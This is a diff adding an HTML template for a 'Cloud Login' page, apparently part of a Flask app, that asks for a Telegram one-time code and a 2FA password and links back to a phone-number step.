@@ -1,0 +1,42 @@
+<html lang="en">
+
+<head>
+  <meta name="viewport" 
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <title>Cloud Login</title>
+  <link rel="stylesheet" type="text/css" href="{{ url_for('static',filename='styles/authandle.css') }}">
+    <link rel="manifest" href="manifest.json">
+</head>
+
+<body>
+  <div class="wrapper">
+    <div id="formContent">
+      
+        <br style="line-height: 2;">
+        <p>Enter OTP sent to <strong>{{ cnCode}} *******{{ unHiddenDigits }}</strong></p>
+        
+        <input class="valInput" type="number" id="otp" name="inputOtp" placeholder="Check your Telegram">
+        <div class="twofa">
+            <p>2FA Password</p>
+            <div class="password-container">
+              <input class="valInput" type="password" id="password" name="inputPassword" placeholder="Enter your Password">
+              <span id="showPassword">show</span>
+            </div>
+        </div>
+      <br><br>
+      <input type="button" id="continue_btn" onclick=verify() value="Login">
+      <img src="{{ url_for('static',filename='images/rolling.svg') }}" id="loading_svg">
+
+      <!-- Previous Page -->
+      <div id="formFooter">
+        <a class="underlineHover" href="/?p={{ pNum }}" onclick=clearCookies()>Change Phone [Resend]</a>
+      </div>
+
+    </div>
+  </div>
+  
+  <div id="flash-message" class="flash-message"></div>
+  <script src="{{ url_for('static', filename='scripts/authandle.js') }}"></script>
+</body>
+
+</html>
